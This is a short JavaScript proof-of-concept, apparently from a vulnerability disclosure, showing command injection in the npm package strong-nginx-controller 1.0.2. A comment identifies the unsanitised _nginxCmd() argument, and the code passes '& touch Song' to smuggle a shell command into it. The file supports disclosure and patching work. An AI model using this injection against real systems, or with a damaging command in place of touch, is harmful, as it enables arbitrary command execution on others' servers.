/**
 * strong-nginx-controller@1.0.2 is vulnerable to command injection.
 * the injection point is located in line 65 of file "lib/server.js", which is 
 * the index of the package.
 * the first argument of function _nginxCmd() can be controlled by users without 
 * any sanitization.
 */


var Root = require("strong-nginx-controller");
var baseDir = "";
var nginxPath = "./";
var controlEndpoint = {
  hostname: "abd",
  port: 123
}
var listenEndpoint =12;
var nginxRoot = "";
var root = new Root(baseDir, nginxPath, controlEndpoint, listenEndpoint,nginxRoot);
var action = "& touch Song";
root._nginxCmd(action,function(){});
